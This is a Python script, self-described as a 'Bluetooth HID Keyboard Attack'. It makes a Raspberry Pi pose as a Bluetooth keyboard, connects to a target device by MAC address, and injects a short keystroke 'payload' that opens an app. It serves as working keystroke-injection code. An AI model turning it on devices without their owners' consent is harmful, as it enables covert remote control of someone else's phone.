#!/usr/bin/env python3
"""
bt_hid_simple.py
Simpler Bluetooth HID implementation focusing on reliable channel establishment
"""

import os
import sys
import time
import socket
import bluetooth
from bluetooth import *

# Configuration
HID_CONTROL_PSM = 17
HID_INTERRUPT_PSM = 19

# HID Report Descriptor (Basic Keyboard)
HID_DESCRIPTOR = bytes([
    0x05, 0x01,  # Usage Page (Generic Desktop)
    0x09, 0x06,  # Usage (Keyboard)
    0xA1, 0x01,  # Collection (Application)
    0x05, 0x07,  #   Usage Page (Key Codes)
    0x19, 0xE0,  #   Usage Minimum (224)
    0x29, 0xE7,  #   Usage Maximum (231)
    0x15, 0x00,  #   Logical Minimum (0)
    0x25, 0x01,  #   Logical Maximum (1)
    0x75, 0x01,  #   Report Size (1)
    0x95, 0x08,  #   Report Count (8)
    0x81, 0x02,  #   Input (Modifier keys)
    0x95, 0x01,  #   Report Count (1)
    0x75, 0x08,  #   Report Size (8)
    0x81, 0x01,  #   Input (Reserved)
    0x95, 0x06,  #   Report Count (6)
    0x75, 0x08,  #   Report Size (8)
    0x15, 0x00,  #   Logical Minimum (0)
    0x25, 0x65,  #   Logical Maximum (101)
    0x05, 0x07,  #   Usage Page (Key Codes)
    0x19, 0x00,  #   Usage Minimum (0)
    0x29, 0x65,  #   Usage Maximum (101)
    0x81, 0x00,  #   Input (Key array)
    0xC0         # End Collection
])

# Keycodes
KEYS = {
    'a': 0x04, 'b': 0x05, 'c': 0x06, 'd': 0x07, 'e': 0x08, 'f': 0x09,
    'g': 0x0A, 'h': 0x0B, 'i': 0x0C, 'j': 0x0D, 'k': 0x0E, 'l': 0x0F,
    'm': 0x10, 'n': 0x11, 'o': 0x12, 'p': 0x13, 'q': 0x14, 'r': 0x15,
    's': 0x16, 't': 0x17, 'u': 0x18, 'v': 0x19, 'w': 0x1A, 'x': 0x1B,
    'y': 0x1C, 'z': 0x1D, ' ': 0x2C, '\n': 0x28
}

class HIDKeyboard:
    def __init__(self):
        self.ctrl_sock = None
        self.intr_sock = None
        self.ctrl_client = None
        self.intr_client = None
        
    def setup_sockets(self):
        """Create and bind L2CAP sockets for HID"""
        print("[*] Creating HID sockets...")
        
        # Control socket
        self.ctrl_sock = BluetoothSocket(L2CAP)
        self.ctrl_sock.bind(("", HID_CONTROL_PSM))
        self.ctrl_sock.listen(1)
        print(f"[*] Control channel listening on PSM {HID_CONTROL_PSM}")
        
        # Interrupt socket
        self.intr_sock = BluetoothSocket(L2CAP)
        self.intr_sock.bind(("", HID_INTERRUPT_PSM))
        self.intr_sock.listen(1)
        print(f"[*] Interrupt channel listening on PSM {HID_INTERRUPT_PSM}")
        
    def wait_for_connection(self):
        """Wait for both control and interrupt connections"""
        print("\n[*] Waiting for HID connection...")
        print("[*] Pair your Android device now:")
        print("    Settings > Bluetooth > Search for devices")
        print("    Select 'RPi5-Keyboard'\n")
        
        # Accept control connection
        print("[*] Waiting for control channel...")
        self.ctrl_client, ctrl_addr = self.ctrl_sock.accept()
        print(f"[+] Control connected from {ctrl_addr}")
        
        # Accept interrupt connection
        print("[*] Waiting for interrupt channel...")
        self.intr_client, intr_addr = self.intr_sock.accept()
        print(f"[+] Interrupt connected from {intr_addr}")
        
        print("[+] Both channels connected! Ready to send keystrokes.")
        
    def connect_to_target(self, target_mac):
        """Actively connect to target device"""
        print("\n[*] Initiating connection to target...")
        print(f"[*] Target: {target_mac}")
        print("")
        print("[!] IMPORTANT: The target device must:")
        print("    1. Have Bluetooth enabled")
        print("    2. Be discoverable (in Bluetooth settings)")
        print("    3. Have previously paired with this Pi")
        print("    OR be ready to accept pairing")
        print("")
        
        try:
            # Connect control channel
            print("[*] Connecting control channel (PSM 17)...")
            self.ctrl_client = BluetoothSocket(L2CAP)
            self.ctrl_client.connect((target_mac, HID_CONTROL_PSM))
            print(f"[+] Control channel connected!")
            
            # Small delay between channel connections
            time.sleep(0.5)
            
            # Connect interrupt channel
            print("[*] Connecting interrupt channel (PSM 19)...")
            self.intr_client = BluetoothSocket(L2CAP)
            self.intr_client.connect((target_mac, HID_INTERRUPT_PSM))
            print(f"[+] Interrupt channel connected!")
            
            print("[+] Both channels connected! Ready to send keystrokes.")
            
        except bluetooth.btcommon.BluetoothError as e:
            print(f"[!] Bluetooth connection failed: {e}")
            print("")
            print("Common causes:")
            print("  1. Device not paired - pair first:")
            print(f"     bluetoothctl")
            print(f"     scan on")
            print(f"     pair {target_mac}")
            print(f"     trust {target_mac}")
            print(f"     quit")
            print("  2. Device not in range")
            print("  3. Device Bluetooth is off")
            print("  4. Device already connected to another device")
            raise
        except Exception as e:
            print(f"[!] Connection error: {e}")
            raise
        
    def send_report(self, report):
        """Send HID report via interrupt channel"""
        if self.intr_client:
            # HID reports need 0xA1 0x01 prefix for Bluetooth
            full_report = bytes([0xA1, 0x01]) + report
            self.intr_client.send(full_report)
            
    def press_key(self, keycode, modifier=0):
        """Press and release a key"""
        # Key press
        report = bytes([modifier, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00])
        self.send_report(report)
        time.sleep(0.05)
        
        # Key release
        report = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        self.send_report(report)
        time.sleep(0.05)
        
    def type_string(self, text):
        """Type a string of characters"""
        for char in text.lower():
            if char in KEYS:
                self.press_key(KEYS[char])
            else:
                print(f"[!] Character not supported: {repr(char)}")
                
    def run_payload(self):
        """Execute the attack payload"""
        print("\n" + "="*50)
        print("PAYLOAD EXECUTION")
        print("="*50)
        
        print("[*] Waiting 2 seconds for stability...")
        time.sleep(2)
        
        try:
            # Wake device with space
            print("[*] Pressing Space to wake...")
            self.press_key(KEYS[' '])
            time.sleep(0.5)
            
            # Press Down arrow once
            print("[*] Pressing Down arrow...")
            self.press_key(0x51)  # Down arrow keycode
            time.sleep(0.3)
            
            # Press Right arrow four times
            print("[*] Pressing Right arrow 4 times...")
            for i in range(4):
                self.press_key(0x4F)  # Right arrow keycode
                time.sleep(0.3)
            
            # Press Enter to open the app
            print("[*] Pressing Enter to open app...")
            self.press_key(KEYS['\n'])
            
            print("[+] Payload complete!")
            print("\n[*] Connection will remain active. Press Ctrl+C to exit.")
            
        except Exception as e:
            print(f"[!] Payload error: {e}")
            
    def cleanup(self):
        """Close all sockets"""
        print("\n[*] Cleaning up...")
        for sock in [self.ctrl_client, self.intr_client, self.ctrl_sock, self.intr_sock]:
            if sock:
                try:
                    sock.close()
                except:
                    pass

def setup_bluetooth_service():
    """Register HID service using sdptool"""
    print("[*] Registering HID service...")
    
    # Create SDP record file
    sdp_record = f"""<?xml version="1.0" encoding="UTF-8" ?>
<record>
  <attribute id="0x0001">
    <sequence>
      <uuid value="0x1124"/>
    </sequence>
  </attribute>
  <attribute id="0x0004">
    <sequence>
      <sequence>
        <uuid value="0x0100"/>
        <uint16 value="0x0011"/>
      </sequence>
      <sequence>
        <uuid value="0x0011"/>
      </sequence>
    </sequence>
  </attribute>
  <attribute id="0x0005">
    <sequence>
      <uuid value="0x1002"/>
    </sequence>
  </attribute>
  <attribute id="0x0009">
    <sequence>
      <sequence>
        <uuid value="0x1124"/>
        <uint16 value="0x0100"/>
      </sequence>
    </sequence>
  </attribute>
  <attribute id="0x000d">
    <sequence>
      <sequence>
        <sequence>
          <uuid value="0x0100"/>
          <uint16 value="0x0013"/>
        </sequence>
        <sequence>
          <uuid value="0x0011"/>
        </sequence>
      </sequence>
    </sequence>
  </attribute>
  <attribute id="0x0100">
    <text value="RPi5 Keyboard"/>
  </attribute>
  <attribute id="0x0200">
    <uint16 value="0x0100"/>
  </attribute>
  <attribute id="0x0201">
    <uint16 value="0x0111"/>
  </attribute>
  <attribute id="0x0202">
    <uint8 value="0x40"/>
  </attribute>
  <attribute id="0x0206">
    <sequence>
      <sequence>
        <uint8 value="0x22"/>
        <text encoding="hex" value="{HID_DESCRIPTOR.hex()}"/>
      </sequence>
    </sequence>
  </attribute>
</record>"""
    
    # Write to temp file
    with open('/tmp/hid_sdp.xml', 'w') as f:
        f.write(sdp_record)
    
    # Register with sdptool
    import subprocess
    try:
        result = subprocess.run(['sdptool', 'add', '--file=/tmp/hid_sdp.xml'], 
                              capture_output=True, text=True)
        print(f"[*] SDP registration: {result.stdout}")
    except FileNotFoundError:
        print("[!] sdptool not found - SDP registration skipped")
        print("[!] Install bluez-deprecated or use D-Bus registration")

def main():
    if os.geteuid() != 0:
        print("[!] This script must be run as root!")
        print("    Usage: sudo python3 bt_hid_simple.py <target_mac_address>")
        print("    Example: sudo python3 bt_hid_simple.py 18:68:6A:FA:10:43")
        sys.exit(1)
    
    # Check for MAC address argument
    if len(sys.argv) < 2:
        print("[!] Missing target MAC address!")
        print("    Usage: sudo python3 bt_hid_simple.py <target_mac_address>")
        print("    Example: sudo python3 bt_hid_simple.py 18:68:6A:FA:10:43")
        print("")
        print("To find your phone's MAC address:")
        print("  1. On Android: Settings > About Phone > Status > Bluetooth address")
        print("  2. Or scan with: sudo hcitool scan")
        sys.exit(1)
    
    target_mac = sys.argv[1]
    
    # Validate MAC address format
    import re
    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', target_mac):
        print(f"[!] Invalid MAC address format: {target_mac}")
        print("    Expected format: XX:XX:XX:XX:XX:XX")
        sys.exit(1)
        
    # Check if pybluez is installed
    try:
        import bluetooth
    except ImportError:
        print("[!] PyBluez not installed!")
        print("    Install with: sudo apt-get install python3-bluez")
        print("    Or: sudo pip3 install pybluez")
        sys.exit(1)
    
    print("="*50)
    print("Bluetooth HID Keyboard Attack - Simple Version")
    print("="*50)
    print(f"Target MAC: {target_mac}")
    print("")
    
    # Setup SDP record
    setup_bluetooth_service()
    
    # Create keyboard device
    kb = HIDKeyboard()
    
    try:
        # Setup sockets
        kb.setup_sockets()
        
        # Connect to target
        kb.connect_to_target(target_mac)
        
        # Run payload
        kb.run_payload()
        
        # Keep running
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        kb.cleanup()
        
    print("[*] Exiting.")

if __name__ == "__main__":
    main()
